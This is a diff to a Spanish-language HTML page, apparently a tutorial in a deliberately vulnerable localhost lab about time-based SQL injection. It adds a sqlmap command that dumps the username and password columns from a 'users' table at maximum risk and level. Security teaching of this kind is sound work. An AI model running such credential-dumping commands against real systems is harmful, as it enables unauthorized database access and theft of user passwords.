@@ -52,9 +52,12 @@
 
         <h3>Tomar los datos de las columnas</h3>
 
-        <ul>
-          <li></li>
-        </ul>
+        <p>Ahora lanzar el comando para dumpear los datos de las columnas</p>
+
+        <pre>sqlmap -u http&colon;&sol;&sol;localhost&sol;vistas&sol;vulnerabilidades&sol;injection&sol;timebased&period;php --forms --dbms&equals;mysql -D proyecto -T users -C username&comma; password --dump --risk&equals;3 --level&equals;5 --batch -v</pre>
+
+        <hr>
+        <h1>Ejemplo</h1>
 
         <div class="login">
             <div class="account-login">
